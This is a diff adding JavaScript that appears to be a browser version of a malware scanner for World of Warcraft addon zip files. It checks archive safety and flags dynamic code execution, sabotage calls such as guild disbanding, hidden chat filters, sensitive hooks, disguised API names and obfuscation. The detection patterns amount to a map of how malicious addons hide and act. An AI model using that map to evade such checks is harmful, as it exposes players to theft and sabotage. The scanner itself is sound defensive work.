+          else if (body.startsWith("\n")) body = body.slice(1);
+          emit(STRING, i, end, body);
+          i = end;
+          continue;
+        }
+      }
+      if ((c >= "0" && c <= "9") || (c === "." && i + 1 < n && source[i + 1] >= "0" && source[i + 1] <= "9")) {
+        NUMBER_RE.lastIndex = i;
+        const m = NUMBER_RE.exec(source);
+        if (m && NUMBER_RE.lastIndex > i) { emit(NUMBER, i, NUMBER_RE.lastIndex); i = NUMBER_RE.lastIndex; continue; }
+      }
+      NAME_RE.lastIndex = i;
+      const nm = NAME_RE.exec(source);
+      if (nm) {
+        emit(KEYWORDS.has(nm[0]) ? KEYWORD : NAME, i, NAME_RE.lastIndex);
+        i = NAME_RE.lastIndex;
+        continue;
+      }
+      let matched = false;
+      for (const op of OPS) {
+        if (source.startsWith(op, i)) { emit(OP, i, i + op.length); i += op.length; matched = true; break; }
+      }
+      if (!matched) i++;
+    }
+    return tokens;
+  }
+
+  // ------------------------------------------------------------------ scope-aware scan (lua.py)
+
+  const VALUE_END_KW = new Set(["end", "nil", "true", "false", "..."]);
+  const STATEMENT_KW = new Set(["local", "if", "for", "while", "repeat", "return", "do", "end", "break", "goto", "else", "elseif", "until", "function"]);
+  const GUARD_BEFORE_KW = new Set(["if", "elseif", "while", "and", "or", "not", "until"]);
+  const GUARD_AFTER = new Set(["and", "or", "then", "do"]);
+
+  class Scope {
+    constructor(parent) { this.names = new Set(); this.parent = parent; }
+    has(name) { for (let s = this; s; s = s.parent) if (s.names.has(name)) return true; return false; }
+  }
+  const isValueEnd = (t) => t.kind === NAME || t.kind === NUMBER || t.kind === STRING || isOp(t, ")", "]", "}") || (t.kind === KEYWORD && VALUE_END_KW.has(t.value));
+
+  function looksLikeAssignment(toks, j) {
+    let k = j;
+    while (k + 1 < toks.length && isOp(toks[k], ",")) {
+      if (toks[k + 1].kind !== NAME) return false;
+      k += 2;
+      while (k + 1 < toks.length && isOp(toks[k], ".") && toks[k + 1].kind === NAME) k += 2;
+    }
+    return k < toks.length && isOp(toks[k], "=");
+  }
+
+  function scan(path, source) {
+    const toks = tokenize(source);
+    const n = toks.length;
+    const refs = [], defines = new Set(), guarded = new Set(), reassigned = new Set();
+    const root = new Scope(null);
+    let scope = root;
+    const blocks = [];
+    let pendingLoop = [];
+    let pendingLocals = [];
+    const brackets = [];
+    const push = (names) => { scope = new Scope(scope); for (const x of names || []) scope.names.add(x); blocks.push(scope); };
+    const pop = () => { if (blocks.length) { blocks.pop(); scope = blocks.length ? blocks[blocks.length - 1] : root; } };
+    const flush = (force) => {
+      const keep = [];
+      for (const p of pendingLocals) {
+        if (force || p[2] === blocks.length) for (const x of p[0]) p[1].names.add(x);
+        else keep.push(p);
+      }
+      pendingLocals = keep;
+    };
+
+    let i = 0;
+    while (i < n) {
+      const t = toks[i];
+      const prev = i ? toks[i - 1] : null;
+      if (pendingLocals.length && !brackets.length && prev) {
+        if (isOp(t, ";") || (t.kind === KEYWORD && STATEMENT_KW.has(t.value) && t.value !== "function") || (t.kind === NAME && t.line > prev.line && isValueEnd(prev))) flush(false);
+      }
+      if (t.kind === OP) {
+        if ("([{".includes(t.value) && t.value.length === 1) brackets.push(t.value);
+        else if (")]}".includes(t.value) && t.value.length === 1) { if (brackets.length) brackets.pop(); }
+        i++;
+        continue;
+      }
+      if (t.kind === KEYWORD) {
+        const v = t.value;
+        if (v === "local") {
+          const nxt = i + 1 < n ? toks[i + 1] : null;
+          if (nxt && isKw(nxt, "function")) {
+            if (i + 2 < n && toks[i + 2].kind === NAME) scope.names.add(toks[i + 2].value);
+            i++;
+            continue;
+          }
+          const names = [];
+          let j = i + 1;
+          while (j < n && toks[j].kind === NAME) {
+            names.push(toks[j].value);
+            j++;
+            if (j < n && isOp(toks[j], "<")) j += 3;
+            if (j < n && isOp(toks[j], ",")) { j++; continue; }
+            break;
+          }
+          if (j < n && isOp(toks[j], "=")) pendingLocals.push([names, scope, blocks.length]);
+          else for (const x of names) scope.names.add(x);
+          i = j;
+          continue;
+        }
+        if (v === "function") {
+          let j = i + 1, method = false;
+          if (j < n && toks[j].kind === NAME) {
+            const chain = [toks[j].value];
+            const first = toks[j];
+            j++;
+            while (j + 1 < n && isOp(toks[j], ".", ":") && toks[j + 1].kind === NAME) {
+              method = method || toks[j].value === ":";
+              chain.push(toks[j + 1].value);
+              j += 2;
+            }
+            if (chain.length === 1) { if (!scope.has(chain[0])) defines.add(chain[0]); }
+            else if (!scope.has(chain[0])) {
+              if (!method) defines.add(chain.slice(0, 2).join("."));
+              refs.push({ name: chain[0], tok: first, index: i + 1, end: i + 2, isCall: false, guarded: true });
+            }
+          }
+          const params = method ? ["self"] : [];
+          if (j < n && isOp(toks[j], "(")) {
+            j++;
+            while (j < n && !isOp(toks[j], ")")) { if (toks[j].kind === NAME) params.push(toks[j].value); j++; }
+            j++;
+          }
+          push(params);
+          i = j;
+          continue;
+        }
+        if (v === "for") {
+          let j = i + 1;
+          pendingLoop = [];
+          while (j < n && !(isOp(toks[j], "=") || isKw(toks[j], "in"))) { if (toks[j].kind === NAME) pendingLoop.push(toks[j].value); j++; }
+          i = j;
+          continue;
+        }
+        if (v === "do") { push(pendingLoop); pendingLoop = []; }
+        else if (v === "then" || v === "repeat") push();
+        else if (v === "elseif") pop();
+        else if (v === "else") { pop(); push(); }
+        else if (v === "end" || v === "until") { flush(false); pop(); }
+        else if (v === "goto") { i += 2; continue; }
+        i++;
+        continue;
+      }
+      if (t.kind !== NAME) { i++; continue; }
+      if (prev && (isOp(prev, ".", ":", "::") || isKw(prev, "goto"))) { i++; continue; }
+      const nxt = i + 1 < n ? toks[i + 1] : null;
+      if (brackets.length && brackets[brackets.length - 1] === "{" && nxt && isOp(nxt, "=") && prev && isOp(prev, "{", ",", ";")) { i++; continue; }
+      if (scope.has(t.value)) {
+        if (nxt && isOp(nxt, "=") && !brackets.length) reassigned.add(t.value);
+        i++;
+        continue;
+      }
+      let j = i + 1;
+      let full = t.value;
+      if (j + 1 < n && isOp(toks[j], ".") && toks[j + 1].kind === NAME) {
+        full = t.value + "." + toks[j + 1].value;
+        j += 2;
+        while (j + 1 < n && isOp(toks[j], ".") && toks[j + 1].kind === NAME) j += 2;
+      }
+      const after = j < n ? toks[j] : null;
+      let isCall = !!after && (isOp(after, "(") || after.kind === STRING || isOp(after, "{"));
+      if (after && isOp(after, ":")) isCall = true;
+      const assigned = !!after && isOp(after, "=") && !brackets.length;
+      const multi = !!after && isOp(after, ",") && !brackets.length && looksLikeAssignment(toks, j);
+      if (assigned || multi) { defines.add(full); i = j; continue; }
+      const isGuard =
+        (!!prev &&
+          ((prev.kind === KEYWORD && GUARD_BEFORE_KW.has(prev.value)) ||
+            (isOp(prev, "(") && i >= 2 && toks[i - 2].kind === NAME && ["type", "issecurevariable", "rawget"].includes(toks[i - 2].value))) &&
+          !isCall) ||
+        (!!after && ((after.kind === KEYWORD && GUARD_AFTER.has(after.value)) || isOp(after, "==", "~=")) && !isCall);
+      if (isGuard) { guarded.add(full); guarded.add(t.value); }
+      refs.push({ name: full, tok: t, index: i, end: j, isCall, guarded: isGuard });
+      i = full !== t.value ? j : i + 1;
+    }
+    flush(true);
+    for (const r of refs) {
+      const k = r.index;
+      if (reassigned.has(r.name) && k >= 3 && isOp(toks[k - 1], "=") && toks[k - 2].value === r.name && isKw(toks[k - 3], "local")) r.guarded = true;
+    }
+    return { path, refs, defines, guarded, tokens: toks };
+  }
+
+  // ------------------------------------------------------------------ helpers shared with engine.py
+
+  function normpath(path) {
+    if (path === "") return ".";
+    const initial = path.startsWith("/") ? (path.startsWith("//") && !path.startsWith("///") ? 2 : 1) : 0;
+    const out = [];
+    for (const comp of path.split("/")) {
+      if (comp === "" || comp === ".") continue;
+      if (comp !== ".." || (!initial && !out.length) || (out.length && out[out.length - 1] === "..")) out.push(comp);
+      else if (out.length) out.pop();
+    }
+    const joined = "/".repeat(initial) + out.join("/");
+    return joined || ".";
+  }
+  const dirname = (p) => { const i = p.lastIndexOf("/"); if (i < 0) return ""; const head = p.slice(0, i + 1); return /^\/+$/.test(head) ? head : head.replace(/\/+$/, ""); };
+  const basename = (p) => p.slice(p.lastIndexOf("/") + 1);
+  const pjoin = (a, b) => (b.startsWith("/") ? b : !a ? b : a.endsWith("/") ? a + b : a + "/" + b);
+  function splitext(base) {
+    // posixpath.splitext on a basename: leading dots are not an extension
+    let i = base.lastIndexOf(".");
+    if (i <= 0) return "";
+    let k = 0;
+    while (k < i && base[k] === ".") k++;
+    return k === i ? "" : base.slice(i);
+  }
+  const reEscape = (s) => s.replace(/[.*+?^${}()|[\]\\\/-]/g, "\\$&");
+  function pyStrip(s, chars) {
+    let a = 0, b = s.length;
+    while (a < b && chars.includes(s[a])) a++;
+    while (b > a && chars.includes(s[b - 1])) b--;
+    return s.slice(a, b);
+  }
+  const pyWhitespace = " \t\n\r\x0b\x0c\x1c\x1d\x1e\x1f\x85\xa0                　";
+  const strip = (s) => pyStrip(s, pyWhitespace);
+
+  function make(rules) {
+    const R = rules;
+    const API_CAPABILITY = new Map();
+    for (const [cap, info] of Object.entries(R.capabilities)) for (const api of info.api) API_CAPABILITY.set(api, cap);
+    const HOOK = new Set(R.sensitive_hook_targets);
+    const SENSITIVE_NAMES = new Set([...API_CAPABILITY.keys(), ...HOOK]);
+    const FRAME_PREFIXES = R.sensitive_frame_prefixes;
+    const HIDING_EVENTS = new Set(R.hiding_filter_events);
+    const REMOTE_EVENTS = new Set(R.remote_input_events);
+    const EXE = new Set(R.executable_extensions), SCRIPT = new Set(R.script_extensions), ARCH = new Set(R.archive_extensions), ADDON = new Set(R.addon_extensions);
+    const ORDER = Object.fromEntries(R.severities.map((s, i) => [s, i]));
+    const CODE_RUNNERS = new Set(["loadstring", "load", "RunScript"]);
+    const REGISTER_METHODS = new Set(["RegisterEvent", "RegisterUnitEvent", "RegisterEventCallback"]);
+    const FRIEND_LIST_APIS = new Set(["BNGetNumFriends", "BNGetFriendInfo", "C_BattleNet.GetFriendAccountInfo", "C_FriendList.GetFriendInfoByIndex", "C_FriendList.GetNumFriends"]);
+    const URL_RE = /(?:https?:\/\/|www\.)[^\s"'<>|]+|discord(?:app)?\.(?:gg|com\/invite)\/[\w-]+/gi;
+    const SCRAMBLED_RE = /^(?:[Il1]{6,}|_0x[0-9a-fA-F]{3,}|[lI][lI1_]{7,}|O0{4,}|[_]{4,}\w*)$/;
+    const ESCAPES_RE = /(?:\\(?:\d{1,3}|x[0-9a-fA-F]{2})){24,}/g;
+    const XML_SCRIPT_RE = /<\s*(Script|On[A-Z]\w*)\b([^>]*)>([\s\S]*?)<\/\s*\1\s*>/g;
+    const XML_FILE_REF_RE = /<\s*(?:Script|Include)\b[^>]*?\bfile\s*=\s*["']([^"']+)["']/gi;
+    const TEMPLATE_FUNCS = new Set(["format", "gsub", "rep", "tostring", "concat", "join", "upper", "lower", "sub", "string", "table", "strjoin", "assert"]);
+    const MAX_ENTRIES = 20000, MAX_TOTAL = 300 * 1024 * 1024, MAX_FILE = 40 * 1024 * 1024, MAX_RATIO = 200;
+    const startsWithAny = (s, prefixes) => prefixes.some((p) => s.startsWith(p));
+
+    // -------------------------------------------------------------- package
+
+    function hitAdder(hits) {
+      return (rule, path, detail) => {
+        if (!hits.has(rule)) hits.set(rule, { id: rule, evidence: [] });
+        hits.get(rule).evidence.push({ file: path, line: 0, detail, snippet: "" });
+      };
+    }
+    function safeMember(name) {
+      const raw = name.replace(/\\/g, "/");
+      const escapes = raw.startsWith("/") || /^[A-Za-z]:/.test(raw) || raw.split("/").includes("..");
+      const norm = pyStrip(raw, "/") ? normpath(raw.replace(/^\/+/, "")) : raw;
+      return [norm, escapes];
+    }
+    function classify(path, hit) {
+      const lower = path.toLowerCase();
+      const base = basename(lower);
+      const ext = splitext(base);
+      if (EXE.has(ext)) hit("PKG_EXECUTABLE", path, ext);
+      else if (SCRIPT.has(ext)) hit("PKG_SCRIPT", path, ext);
+      else if (ARCH.has(ext)) hit("PKG_NESTED_ARCHIVE", path, ext);
+      else if (ext && !ADDON.has(ext) && !["license", "readme", "changelog", "copying", "authors"].includes(base)) hit("PKG_UNUSUAL_FILE", path, ext);
+    }
+    const wanted = (p) => /\.(lua|xml|toc)$/i.test(p);
+
+    async function inflateRaw(bytes) {
+      const ds = new DecompressionStream("deflate-raw");
+      const stream = new Blob([bytes]).stream().pipeThrough(ds);
+      return new Uint8Array(await new Response(stream).arrayBuffer());
+    }
+
+    async function readZip(buffer, name) {
+      const data = new Uint8Array(buffer);
+      const dv = new DataView(data.buffer, data.byteOffset, data.byteLength);
+      // End of central directory: search backwards (comment can be up to 64 KB)
+      let eocd = -1;
+      for (let p = data.length - 22; p >= Math.max(0, data.length - 22 - 65535); p--) {
+        if (dv.getUint32(p, true) === 0x06054b50) { eocd = p; break; }
+      }
+      if (eocd < 0) throw new ScanError("not a valid zip file: File is not a zip file");
+      let count = dv.getUint16(eocd + 10, true);
+      let cdOffset = dv.getUint32(eocd + 16, true);
+      if (count === 0xffff || cdOffset === 0xffffffff) throw new ScanError("ZIP64 archives are not supported in the browser; use the command line tool");
+      if (count > MAX_ENTRIES) throw new ScanError(`too many files in the zip (${count})`);
+      const dec = new TextDecoder("utf-8");
+      const dec437 = (u8) => Array.from(u8, (b) => (b < 128 ? String.fromCharCode(b) : CP437[b - 128])).join("");
+      const infos = [];
+      let p = cdOffset;
+      for (let k = 0; k < count; k++) {
+        if (p + 46 > data.length || dv.getUint32(p, true) !== 0x02014b50) throw new ScanError("not a valid zip file: bad central directory");
+        const flags = dv.getUint16(p + 8, true);
+        const method = dv.getUint16(p + 10, true);
+        const csize = dv.getUint32(p + 20, true);
+        const usize = dv.getUint32(p + 24, true);
+        const nlen = dv.getUint16(p + 28, true), xlen = dv.getUint16(p + 30, true), clen = dv.getUint16(p + 32, true);
+        const extAttr = dv.getUint32(p + 38, true);
+        const local = dv.getUint32(p + 42, true);
+        const nameBytes = data.subarray(p + 46, p + 46 + nlen);
+        const fname = flags & 0x800 ? dec.decode(nameBytes) : dec437(nameBytes);
+        infos.push({ filename: fname, flags, method, csize, usize, extAttr, local });
+        p += 46 + nlen + xlen + clen;
+      }
+      const files = new Map();
+      const hits = new Map();
+      const hit = hitAdder(hits);
+      let total = 0;
+      for (const info of infos) {
+        const [path, escapes] = safeMember(info.filename);
+        if (escapes) hit("PKG_PATH_TRAVERSAL", info.filename, "path leaves the folder");
+        const mode = info.extAttr >>> 16;
+        if ((mode & 0o170000) === 0o120000) { hit("PKG_PATH_TRAVERSAL", info.filename, "symbolic link"); continue; }
+        if (info.filename.endsWith("/")) continue;
+        classify(path, hit);
+        total += info.usize;
+        if (total > MAX_TOTAL) throw new ScanError("the zip unpacks to more than 300 MB; refusing to scan it");
+        if (info.usize > 10 * 1024 * 1024 && info.csize && info.usize / info.csize > MAX_RATIO) throw new ScanError(`${info.filename} looks like a zip bomb (compression ratio over ${MAX_RATIO})`);
+        if (info.flags & 0x1) { hit("PKG_ENCRYPTED", path, "password protected"); continue; }
+        if (wanted(path) && info.usize <= MAX_FILE) {
+          const lp = info.local;
+          if (dv.getUint32(lp, true) !== 0x04034b50) throw new ScanError(`cannot read ${info.filename}: bad local header`);
+          const start = lp + 30 + dv.getUint16(lp + 26, true) + dv.getUint16(lp + 28, true);
+          const raw = data.subarray(start, start + info.csize);
+          let bytes;
+          if (info.method === 0) bytes = raw;
+          else if (info.method === 8) {
+            try { bytes = await inflateRaw(raw); } catch (e) { throw new ScanError(`cannot read ${info.filename}: ${e.message}`); }
+          } else throw new ScanError(`cannot read ${info.filename}: compression method ${info.method} is not supported in the browser; use the command line tool`);
+          files.set(path, bytes);
+        }
+      }
+      return { name, files, hits: [...hits.values()], entries: infos.filter((x) => !x.filename.endsWith("/")).length, totalBytes: total };
+    }
+
+    // -------------------------------------------------------------- units
+
+    const decoder = new TextDecoder("utf-8");
+    const decode = (bytes) => decoder.decode(bytes);
+    const xmlUnescape = (s) => s.replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&quot;/g, '"').replace(/&apos;/g, "'").replace(/&amp;/g, "&");
+
+    function buildUnits(files) {
+      const units = [];
+      const paths = [...files.keys()].sort();
+      for (const path of paths) {
+        const lower = path.toLowerCase();
+        if (lower.endsWith(".lua")) units.push({ path, source: decode(files.get(path)), lineOffset: 0 });
+        else if (lower.endsWith(".xml")) {
+          const text = decode(files.get(path));
+          const nc = text.replace(/<!--[\s\S]*?-->/g, (m) => "\n".repeat((m.match(/\n/g) || []).length));
+          let k = 0;
+          XML_SCRIPT_RE.lastIndex = 0;
+          let m;
+          while ((m = XML_SCRIPT_RE.exec(nc))) {
+            k++;
+            let body = m[3];
+            if (!strip(body)) continue;
+            body = body.split("<![CDATA[").join("         ").split("]]>").join("   ");
+            const bodyStart = m.index + m[0].indexOf(">") + 1;
+            const line = (nc.slice(0, bodyStart).match(/\n/g) || []).length + 1;
+            units.push({ path: `${path}#${m[1]}${k}`, source: xmlUnescape(body), lineOffset: line - 1 });
+          }
+        }
+      }
+      for (const u of units) { u.scan = scan(u.path, u.source); u.lines = u.source.split("\n"); }
+      return units;
+    }
+
+    function ev(u, t, detail) {
+      const line = t.line;
+      let text = line > 0 && line <= u.lines.length ? strip(u.lines[line - 1]) : "";
+      if (text.length > 160) {
+        const start = Math.max(0, t.col - 60);
+        text = (start ? "…" : "") + text.slice(start, start + 150) + "…";
+      }
+      return { file: u.path.split("#")[0], line: line + u.lineOffset, detail, snippet: text };
+    }
+
+    // -------------------------------------------------------------- facts
+
+    function newFacts() {
+      const caps = new Map();
+      return {
+        caps, hits: new Map(), remoteInput: new Set(), dynamicCode: new Map(), templateCode: new Map(), obfuscated: new Set(),
+        hiding: new Map(), moneyUnits: new Set(), overrides: [], urls: new Map(), ownDialogs: new Set(),
+        cap(c) { if (!caps.has(c)) caps.set(c, []); return caps.get(c); },
+        list(map, k) { if (!map.has(k)) map.set(k, []); return map.get(k); },
+        hit(rule, e) {
+          if (!this.hits.has(rule)) this.hits.set(rule, { id: rule, evidence: [] });
+          const h = this.hits.get(rule);
+          if (h.evidence.length < 50 && !h.evidence.some((x) => x.file === e.file && x.line === e.line && x.detail === e.detail)) h.evidence.push(e);
+        },
+      };
+    }
+
+    function closing(toks, open) {
+      let depth = 0;
+      for (let k = open; k < toks.length; k++) {
+        if (isOp(toks[k], "(", "[", "{")) depth++;
+        else if (isOp(toks[k], ")", "]", "}")) { depth--; if (depth === 0) return k; }
+      }
+      return toks.length - 1;
+    }
+    function literalString(ts) {
+      if (ts.length && ts.every((t) => t.kind === STRING || isOp(t, "..")) && ts[0].kind === STRING) return ts.filter((t) => t.kind === STRING).map((t) => t.value).join("");
+      return null;
+    }
+    function dotted(toks, k) {
+      const parts = [toks[k].value];
+      let j = k + 1;
+      while (j + 1 < toks.length && isOp(toks[j], ".") && toks[j + 1].kind === NAME) { parts.push(toks[j + 1].value); j += 2; }
+      return [parts.slice(0, 2).join("."), j];
+    }
+    function isLocal(s, name) {
+      const base = name.split(".")[0];
+      return !s.refs.some((r) => r.name === name || r.name.split(".")[0] === base) && !s.defines.has(name);
+    }
+    function polyfill(toks, eq, name) {
+      const [rhs, j] = eq + 1 < toks.length && toks[eq + 1].kind === NAME ? dotted(toks, eq + 1) : ["", eq + 1];
+      return rhs === name && j < toks.length && isKw(toks[j], "or");
+    }
+    function assignedFromLiteral(toks, name) {
+      let seen = false;
+      for (let k = 0; k < toks.length - 2; k++) {
+        if (toks[k].kind === NAME && toks[k].value === name && isOp(toks[k + 1], "=") && (k === 0 || !isOp(toks[k - 1], ".", ":"))) {
+          seen = true;
+          const rhs = toks[k + 2];
+          if (rhs.kind === STRING) continue;
+          if (rhs.kind === NAME && rhs.value === name && k + 3 < toks.length && isOp(toks[k + 3], ":", "..")) continue;
+          if (isOp(rhs, "(") && k + 3 < toks.length && toks[k + 3].kind === STRING) continue;
+          if (rhs.kind === NAME && (rhs.value === "format" || rhs.value === "string")) continue;
+          return false;
+        }
+      }
+      return seen;
+    }
+    function templateArgument(toks, open) {
+      if (open >= toks.length) return false;
+      if (toks[open].kind === STRING) return true;
+      if (!isOp(toks[open], "(")) return false;
+      const close = closing(toks, open);
+      let depth = 0;
+      const first = [];
+      for (const t of toks.slice(open + 1, close)) {
+        if (isOp(t, "(", "[", "{")) depth++;
+        else if (isOp(t, ")", "]", "}")) depth--;
+        else if (depth === 0 && isOp(t, ",")) break;
+        first.push(t);
+      }
+      if (!first.length) return false;
+      if (first[0].kind === STRING) return true;
+      let afterColon = false;
+      for (const t of first) {
+        if (t.kind === STRING || t.kind === NUMBER || t.kind === OP) { afterColon = isOp(t, ":", "."); continue; }
+        if (t.kind === NAME) {
+          if (afterColon || TEMPLATE_FUNCS.has(t.value)) { afterColon = false; continue; }
+          if (!assignedFromLiteral(toks, t.value)) return false;
+        }
+        afterColon = false;
+      }
+      return true;
+    }
+    function entropy(s) {
+      if (!s) return 0;
+      const counts = new Map();
+      for (const ch of s) counts.set(ch, (counts.get(ch) || 0) + 1);
+      const total = [...s].length;
+      let e = 0;
+      for (const c of counts.values()) e -= (c / total) * Math.log2(c / total);
+      return e;
+    }
+    const isByte = (text) => { const v = parseNum(text); return v !== null && Number.isInteger(v) && v >= 0 && v <= 255; };
+    function parseNum(text) {
+      // Python int(text, 0): decimal or 0x/0o/0b prefixes, no floats
+      if (/^0[xX][0-9a-fA-F]+$/.test(text)) return parseInt(text, 16);
+      if (/^(0|[1-9][0-9]*)$/.test(text)) return parseInt(text, 10);
+      return null;
+    }
+
+    function createdDialogs(toks) {
+      const out = new Set();
+      for (let k = 0; k < toks.length; k++) {
+        const t = toks[k];
+        if (t.kind === NAME && t.value === "StaticPopupDialogs" && k + 1 < toks.length && isOp(toks[k + 1], "[")) {
+          const close = closing(toks, k + 1);
+          const key = literalString(toks.slice(k + 2, close));
+          if (key && close + 2 < toks.length && isOp(toks[close + 1], "=") && isOp(toks[close + 2], "{")) out.add(key);
+        }
+      }
+      return out;
+    }
+
+    function namedAccess(u, facts, t, name, toks, close) {
+      const key = u.path.split("#")[0];
+      const cap = API_CAPABILITY.get(name);
+      if (cap) {
+        const e = ev(u, t, `_G["${name}"]`);
+        if (facts.cap(cap).length < 40) facts.cap(cap).push(e);
+        if (cap === "money") facts.moneyUnits.add(key);
+        if (CODE_RUNNERS.has(name)) { facts.list(facts.dynamicCode, key).push(e); facts.hit("DYNAMIC_CODE", e); }
+      }
+      if (HOOK.has(name) && close + 1 < toks.length && isOp(toks[close + 1], "=")) {
+        if (!polyfill(toks, close + 1, name)) {
+          const e = ev(u, t, `_G["${name}"] =`);
+          facts.hit("BLIZZARD_OVERRIDE_SENSITIVE", e);
+          facts.overrides.push(e);
+          facts.list(facts.hiding, key).push(e);
+        }
+      }
+    }
+
+    function analyseUnit(u, facts, addonDefines) {
+      const s = u.scan;
+      const toks = s.tokens;
+      const n = toks.length;
+      const key = u.path.split("#")[0];
+      for (const r of s.refs) {
+        const name = API_CAPABILITY.has(r.name) ? r.name : r.name.split(".")[0];
+        const cap = API_CAPABILITY.get(name);
+        if (cap === undefined || (addonDefines.has(name) && !SENSITIVE_NAMES.has(name))) continue;
+        const e = ev(u, r.tok, name);
+        if (facts.cap(cap).length < 40) facts.cap(cap).push(e);
+        if (cap === "money") facts.moneyUnits.add(key);
+        if (CODE_RUNNERS.has(name) && r.isCall) {
+          if (templateArgument(toks, r.end)) { facts.list(facts.templateCode, key).push(e); continue; }
+          facts.list(facts.dynamicCode, key).push(e);
+          facts.hit("DYNAMIC_CODE", e);
+        }
+        if (cap === "sabotage") facts.hit(name === "GuildDisband" ? "GUILD_DISBAND" : "SABOTAGE", e);
+        if (cap === "macros" && (name === "CreateMacro" || name === "EditMacro")) facts.hit("MACRO_WRITE", e);
+      }
+      for (let k = 0; k < n; k++) {
+        const t = toks[k];
+        const nxt = k + 1 < n ? toks[k + 1] : null;
+        const nxt2 = k + 2 < n ? toks[k + 2] : null;
+        const prev = k ? toks[k - 1] : null;
+        if (t.kind === NAME) {
+          if (REGISTER_METHODS.has(t.value) && nxt && isOp(nxt, "(") && nxt2) {
+            const arg = nxt2.kind === STRING ? nxt2 : k + 4 < n && isOp(toks[k + 3], ",") ? toks[k + 4] : null;
+            if (arg && arg.kind === STRING && REMOTE_EVENTS.has(arg.value)) facts.remoteInput.add(key);
+          }
+          if (t.value === "RegisterComm" && prev && isOp(prev, ":")) facts.remoteInput.add(key);
+          if (t.value === "RegisterAddonMessagePrefix") facts.remoteInput.add(key);
+          if (t.value.endsWith("AddMessageEventFilter") && nxt && isOp(nxt, "(") && nxt2 && nxt2.kind === STRING && HIDING_EVENTS.has(nxt2.value)) {
+            const e = ev(u, t, nxt2.value);
+            facts.hit("HIDING_FILTER", e);
+            facts.list(facts.hiding, key).push(e);
+          }
+          if (t.value === "hooksecurefunc" && nxt && isOp(nxt, "(")) {
+            let target = null;
+            if (nxt2 && nxt2.kind === STRING) target = nxt2.value;
+            else if (nxt2 && nxt2.kind === NAME && k + 4 < n && isOp(toks[k + 3], ",") && toks[k + 4].kind === STRING) target = `${nxt2.value}.${toks[k + 4].value}`;
+            if (target && (HOOK.has(target) || HOOK.has(target.split(".").pop()))) facts.hit("SENSITIVE_HOOK", ev(u, t, target));
+          }
+          if (startsWithAny(t.value, FRAME_PREFIXES) && !(prev && isOp(prev, ".", ":"))) {
+            let j = k + 1;
+            while (j + 1 < n && isOp(toks[j], ".") && toks[j + 1].kind === NAME) j += 2;
+            const method = j + 1 < n && isOp(toks[j], ":") && toks[j + 1].kind === NAME ? toks[j + 1].value : "";
+            const direct = j === k + 1;
+            if (["Click", "SetScript", "HookScript"].includes(method) || (direct && ["Hide", "SetAlpha", "SetShown", "EnableMouse"].includes(method))) {
+              const e = ev(u, t, `${t.value}:${toks[j + 1].value}`);
+              facts.hit("SENSITIVE_FRAME", e);
+              facts.list(facts.hiding, key).push(e);
+            }
+          }
+          if (t.value === "StaticPopupDialogs" && nxt && isOp(nxt, "[")) {
+            const close = closing(toks, k + 1);
+            const dialog = literalString(toks.slice(k + 2, close));
+            if (close + 3 < n && isOp(toks[close + 1], ".") && toks[close + 2].kind === NAME && isOp(toks[close + 3], "=") && !facts.ownDialogs.has(dialog)) {
+              const e = ev(u, t, `StaticPopupDialogs[…].${toks[close + 2].value}`);
+              facts.hit("SENSITIVE_FRAME", e);
+              facts.list(facts.hiding, key).push(e);
+            }
+          }
+          if (t.value === "_G" && nxt && isOp(nxt, "[")) {
+            const close = closing(toks, k + 1);
+            const lit = literalString(toks.slice(k + 2, close));
+            if (lit !== null) namedAccess(u, facts, t, lit, toks, close);
+            else if (close + 1 < n && isOp(toks[close + 1], "(")) facts.hit("INDIRECT_GLOBAL", ev(u, t, "_G[…](…)"));
+          }
+          if (!(prev && isOp(prev, ".", ":", ",")) && !(prev && isKw(prev, "local"))) {
+            const [full, j] = dotted(toks, k);
+            if (HOOK.has(full) && j < n && isOp(toks[j], "=")) {
+              if (!isLocal(s, full) && !polyfill(toks, j, full)) {
+                const e = ev(u, t, full);
+                facts.hit("BLIZZARD_OVERRIDE_SENSITIVE", e);
+                facts.overrides.push(e);
+                facts.list(facts.hiding, key).push(e);
+              }
+            }
+          }
+          if (t.value === "char" && prev && isOp(prev, ".", ":") && nxt && isOp(nxt, "(")) {
+            const close = closing(toks, k + 1);
+            const nums = toks.slice(k + 2, close).filter((x) => x.kind === NUMBER);
+            if (nums.length && nums.length * 2 - 1 === close - k - 2) {
+              let text = "";
+              for (const x of nums) { const v = parseNum(x.value); if (v === null || v > 0x10ffff) { text = ""; break; } text += String.fromCodePoint(v); }
+              if (SENSITIVE_NAMES.has(text)) facts.hit("BUILT_API_NAME", ev(u, t, `string.char → ${text}`));
+            }
+          }
+        } else if (t.kind === STRING) {
+          if (nxt && isOp(nxt, "..") && !(prev && isOp(prev, ".."))) {
+            const parts = [t.value];
+            let j = k;
+            while (j + 2 < n && isOp(toks[j + 1], "..") && toks[j + 2].kind === STRING) { parts.push(toks[j + 2].value); j += 2; }
+            const joined = parts.join("");
+            if (parts.length > 1 && SENSITIVE_NAMES.has(joined)) facts.hit("BUILT_API_NAME", ev(u, t, parts.map((p) => `"${p}"`).join(" .. ") + ` → ${joined}`));
+          }
+          if (nxt && isOp(nxt, ")") && nxt2 && isOp(nxt2, ":") && k + 3 < n && toks[k + 3].value === "reverse") {
+            const rev = [...t.value].reverse().join("");
+            if (SENSITIVE_NAMES.has(rev)) facts.hit("BUILT_API_NAME", ev(u, t, `"${t.value}":reverse() → ${rev}`));
+          }
+          URL_RE.lastIndex = 0;
+          let m;
+          while ((m = URL_RE.exec(t.value))) {
+            const url = m[0].replace(/[.,;)]+$/, "");
+            if (!facts.urls.has(url.toLowerCase())) facts.urls.set(url.toLowerCase(), ev(u, t, url));
+          }
+        }
+      }
+      obfuscation(u, facts);
+    }
+
+    function obfuscation(u, facts) {
+      const toks = u.scan.tokens;
+      const signals = [];
+      for (const t of toks) {
+        if (t.kind === STRING && [...t.value].length >= 400) {
+          const e = entropy(t.value);
+          if (e >= 5.2) signals.push([t, `encoded string of ${[...t.value].length} characters (entropy ${e.toFixed(1)})`]);
+        }
+      }
+      const escapes = u.source.match(ESCAPES_RE);
+      if (escapes) signals.push([null, `${escapes.length} string(s) written as escaped character codes`]);
+      const scrambled = new Set(toks.filter((t) => t.kind === NAME && SCRAMBLED_RE.test(t.value)).map((t) => t.value));
+      if (scrambled.size >= 8) signals.push([null, `${scrambled.size} scrambled names (e.g. ${[...scrambled].sort().slice(0, 3).join(", ")})`]);
+      let run = 0, best = 0, runStart = null, bestTok = null;
+      for (const t of toks) {
+        if (t.kind === NUMBER && isByte(t.value)) {
+          run++;
